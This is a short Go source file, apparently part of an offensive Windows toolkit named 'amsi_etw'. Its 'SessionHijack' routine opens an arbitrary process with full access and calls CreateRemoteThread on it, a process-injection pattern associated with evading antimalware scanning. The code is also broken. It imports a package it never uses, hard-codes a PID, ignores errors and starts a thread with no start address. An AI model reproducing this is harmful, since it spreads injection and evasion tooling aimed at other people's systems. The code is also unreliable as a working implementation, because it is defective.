//go:build windows

package amsi_etw

import (
"golang.org/x/sys/windows"
"unsafe"
)

type SessionHijack struct{}

func NewSessionHijack() *SessionHijack {
return &SessionHijack{}
}

func (s *SessionHijack) Hijack() error {
kernel32 := windows.NewLazyDLL("kernel32.dll")
procOpenProcess := kernel32.NewProc("OpenProcess")
procCreateRemoteThread := kernel32.NewProc("CreateRemoteThread")

pid := uint32(1234)
handle, _, _ := procOpenProcess.Call(0x1F0FFF, 0, uintptr(pid))

procCreateRemoteThread.Call(handle, 0, 0, 0, 0, 0, 0)
return nil
}
